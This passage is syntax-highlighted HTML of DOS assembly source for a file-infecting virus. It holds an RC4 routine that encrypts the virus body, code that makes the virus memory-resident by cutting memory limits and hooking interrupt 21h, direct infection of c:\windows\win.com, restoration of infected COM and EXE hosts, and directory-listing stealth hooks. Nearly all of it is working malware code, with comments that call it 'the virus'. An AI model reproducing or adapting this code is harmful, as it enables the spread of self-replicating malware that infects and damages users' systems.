  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">temp</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; al = S[j]</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; t = al = S[i] + S[j]</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4state</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; K = al = S[t]</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dest</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; DI = destination</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; cl = byte to en/decrypt</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">             </span><span class="sc1">; cl = cl xor K</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">        </span><span class="sc1">; destination = cl</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dest</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; increase destination</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                </span><span class="sc1">; increase source</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                </span><span class="sc1">; decrease data length</span><span class="sc0">
  </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">crypt_loopy</span><span class="sc0">       </span><span class="sc1">; if zero exit</span><span class="sc0">
  </span><span class="sc6">popa</span><span class="sc0">
  </span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc5">rc4crypt</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

 </span><span class="sc5">key_ptr</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">dest</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">temp</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">rc4state</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">rc4key</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">42</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

 </span><span class="sc5">first</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0">


 </span><span class="sc5">rc4_crypt_start</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">; - RC4 encrypted part begins here -</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">first</span><span class="sc4">],</span><span class="sc5">off</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">archiver</span><span class="sc4">],</span><span class="sc5">off</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0deadh</span><span class="sc0">                 </span><span class="sc1">; installation check...</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                       </span><span class="sc1">; why do i use 0deadh all the time???? :]</span><span class="sc0">

  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0deadh</span><span class="sc0">                 </span><span class="sc1">; if the installation check returns 0deadh</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_outta_here</span><span class="sc0">             </span><span class="sc1">; we are already in memory, and restore</span><span class="sc0">
                                </span><span class="sc1">; control to the host</span><span class="sc0">

 </span><span class="sc5">go_tsr</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; if not, we go resident</span><span class="sc0">

  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                        </span><span class="sc1">; pop ES for a sec, so we can use the PSP</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; push it again, for later use</span><span class="sc0">

  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">140h</span><span class="sc0">     </span><span class="sc1">; decrease the top of memory by 140h * 16 byte</span><span class="sc0">
                                </span><span class="sc1">; from the PSP</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; AX = ES</span><span class="sc0">
  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">; AX - 1</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; ES = AX (= MCB)</span><span class="sc0">

  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">140h</span><span class="sc0">     </span><span class="sc1">; decrease the free amount of memory after the</span><span class="sc0">
                                </span><span class="sc1">; program by 140h * 16 bytes (5kB) from the</span><span class="sc0">
                                </span><span class="sc1">; MCB</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                    
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; ES = AX = 40h (= Bios Data Segment)</span><span class="sc0">

  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">; decrease the free memory by 5 * 1024 bytes</span><span class="sc0">
                                </span><span class="sc1">; (again 5kB) from the Bios</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; AX = free memory (in kB)</span><span class="sc0">
  </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                      </span><span class="sc1">; we need it in paragraphs (segments)</span><span class="sc0">
                                </span><span class="sc1">; free segment = AX * 1024 / 16</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; ES = AX (= free segment)</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                        </span><span class="sc1">; DS = CS</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">        </span><span class="sc1">; the_end - start bytes</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; from DS:start</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">; to   ES:0</span><span class="sc0">
  </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                     </span><span class="sc1">; copy the virus into the free segment</span><span class="sc0">

  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; DS = AX = 0 (= Interrupt Vector Table)</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">new_int_21h</span><span class="sc0">            </span><span class="sc1">; AX = offset of the new interrupt 21h routine</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">           </span><span class="sc1">; substract 'offset start' because we moved it</span><span class="sc0">
                                </span><span class="sc1">; down to offset 0</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; BX = ES (= segment where the new interrupt</span><span class="sc0">
                                </span><span class="sc1">;            routine is in)</span><span class="sc0">

  </span><span class="sc6">cli</span><span class="sc0">                           </span><span class="sc1">; disable ints</span><span class="sc0">
  </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; save the old interrupt's address in BX and</span><span class="sc0">
  </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AX, and overwrite it with the new one</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">original_int_21h</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; save AX and BX in</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">original_int_21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">; the virus's code</span><span class="sc0">
  </span><span class="sc6">sti</span><span class="sc0">                           </span><span class="sc1">; enable ints again</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                       </span><span class="sc1">; DS = ES = CS</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                              </span><span class="sc1">;;;;</span><span class="sc0">

 </span><span class="sc5">get_outta_here</span><span class="sc4">:</span><span class="sc0">

                              </span><span class="sc1">; direct infection of win.com begins here,</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">state</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; save 'state' as it will be changed in the</span><span class="sc0">
                              </span><span class="sc1">; infection routine.</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; save the first 3 bytes in original_3, needed</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_3</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; for later restoration if its a com file.</span><span class="sc0">
  </span><span class="sc6">movsw</span><span class="sc0">
  </span><span class="sc6">movsb</span><span class="sc0">

                                  </span><span class="sc1">; copy the original IP, CS, SS, SP</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_ip</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; from old_ip</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_ip</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; to original_ip</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                        </span><span class="sc1">; 4 words to copy</span><span class="sc0">
  </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">                       </span><span class="sc1">; needed for restoring control if its an exe</span><span class="sc0">
                                  </span><span class="sc1">; file.</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">wincom_done</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; save the return address in</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_int_21h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; original_int_21h (used to</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_int_21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">  </span><span class="sc1">; return from the 'fake' int21h</span><span class="sc0">
                                              </span><span class="sc1">; 4Bh routine.</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">                      </span><span class="sc1">; fake file execution (= infection)</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">wincom</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; c:\windows\win.com</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">new_int_21h</span><span class="sc0">                 </span><span class="sc1">; 'int 21h'</span><span class="sc0">

 </span><span class="sc5">wincom_done</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; return here after infecting win.com</span><span class="sc0">

  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; restore the 'state'</span><span class="sc0">

  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">com</span><span class="sc0">                      </span><span class="sc1">; check the state if we are com or exe</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">restore_com</span><span class="sc0">                  </span><span class="sc1">; jump to restore_com routine if we are com</span><span class="sc0">

 </span><span class="sc5">restore_exe</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; else we must be an exe :)</span><span class="sc0">

  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; restore ES and DS (point to the PSP)</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; AX = ES (= PSP)</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                    </span><span class="sc1">; add 10h paragraphs to AX,</span><span class="sc0">
                                </span><span class="sc1">; 10h * 16 = 100h bytes, so it ignores the</span><span class="sc0">
                                </span><span class="sc1">; PSP and points directly to the beginning of</span><span class="sc0">
                                </span><span class="sc1">; the code/data</span><span class="sc0">

  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; CS = real CS (as before infection)</span><span class="sc0">
                                      </span><span class="sc1">; as the initial CS is 'relative to</span><span class="sc0">
                                      </span><span class="sc1">; start of file' we adjust the initial</span><span class="sc0">
                                      </span><span class="sc1">; CS value by adding AX (beginning of</span><span class="sc0">
                                      </span><span class="sc1">; code/data)</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_ss</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; same for initial SS, as it is a relative</span><span class="sc0">
                                      </span><span class="sc1">; value too</span><span class="sc0">
  </span><span class="sc6">cli</span><span class="sc0">                                 </span><span class="sc1">; disable ints</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; SS = real SS</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_sp</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SP = real SP</span><span class="sc0">
  </span><span class="sc6">sti</span><span class="sc0">                                 </span><span class="sc1">; enable ints</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">                              </span><span class="sc1">; jump to the beginning of the host</span><span class="sc0">
 </span><span class="sc5">original_ip</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                     </span><span class="sc1">; JMP FAR to original_ip,</span><span class="sc0">
 </span><span class="sc5">original_cs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                     </span><span class="sc1">; and original_cs (= JMP FAR CS:IP)</span><span class="sc0">
 </span><span class="sc5">original_sp</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">original_ss</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">


 </span><span class="sc5">restore_com</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; this is where we go to restore control if</span><span class="sc0">
                                  </span><span class="sc1">; we are a com file</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">; move the first 3 bytes</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_3</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; from 'header'</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                     </span><span class="sc1">; to 100h (beginning of com files)</span><span class="sc0">
  </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">; copy them..</span><span class="sc0">

  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                       </span><span class="sc1">; push 100h onto the stack</span><span class="sc0">
  </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; restore control (return to 100h)</span><span class="sc0">

 </span><span class="sc5">new_int_24h</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; new crittical error handler</span><span class="sc0">
  </span><span class="sc6">iret</span><span class="sc0">                            </span><span class="sc1">; just return if its called :)</span><span class="sc0">
 </span><span class="sc5">original_int_24h</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

 </span><span class="sc5">new_int_21h</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; the new interrupt 21h begins here</span><span class="sc0">
  </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; as always, push flags at first</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0deadh</span><span class="sc0">                   </span><span class="sc1">; install check?</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_installcheck</span><span class="sc0">             </span><span class="sc1">; no...</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; yes!? then BX = AX (= 0deadh)</span><span class="sc0">
  </span><span class="sc6">popf</span><span class="sc0">                            </span><span class="sc1">; pop flags again</span><span class="sc0">
  </span><span class="sc6">iret</span><span class="sc0">                            </span><span class="sc1">; and return from interrupt</span><span class="sc0">

 </span><span class="sc5">no_installcheck</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; here we go if there was no install check</span><span class="sc0">

  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">                      </span><span class="sc1">; is something getting executed?</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">                       </span><span class="sc1">; yes? then goto infect</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                      </span><span class="sc1">; findfirst?</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0">                      </span><span class="sc1">; yes? - stealth</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                      </span><span class="sc1">; findnext?</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0">                      </span><span class="sc1">; yes? - stealth</span><span class="sc0">
